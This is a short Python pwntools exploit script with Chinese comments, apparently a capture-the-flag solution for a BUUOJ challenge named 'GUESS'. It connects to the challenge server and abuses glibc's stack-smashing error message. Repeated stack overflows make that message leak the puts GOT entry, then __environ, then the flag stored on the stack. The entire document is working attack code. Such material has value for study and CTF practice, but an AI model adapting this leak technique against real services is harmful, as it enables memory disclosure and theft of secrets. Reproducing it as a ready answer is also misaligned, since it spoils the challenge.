#coding=utf8
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

#p = process('./GUESS')
p = remote('node3.buuoj.cn',28653)
elf = ELF('./GUESS')
puts_got = elf.got['puts']

#同样是stack_chk_fail的应用，flag已经被写入栈中

#连续三次泄露

def stackoverflow(payload):
   p.sendlineafter('Please type your guessing flag',payload)

#第一次泄露出libc地址

stackoverflow(p64(puts_got)*0x200)
p.recvuntil("*** stack smashing detected ***: ")
puts_addr = u64(p.recv(6).ljust(8,"\x00")) 
libc = LibcSearcher("puts",puts_addr)
base_addr = puts_addr - libc.dump("puts")
environ_addr = base_addr + libc.dump('__environ')
log.info(str(hex(environ_addr)))

#第二次泄露出栈地址（flag在栈上）

stackoverflow(p64(environ_addr)*0x200)
p.recvuntil("*** stack smashing detected ***: ")
stack_addr = u64(p.recv(6).ljust(8,'\x00'))
flag_addr = stack_addr - 0x168

stackoverflow(p64(flag_addr)*0x200)

p.interactive()
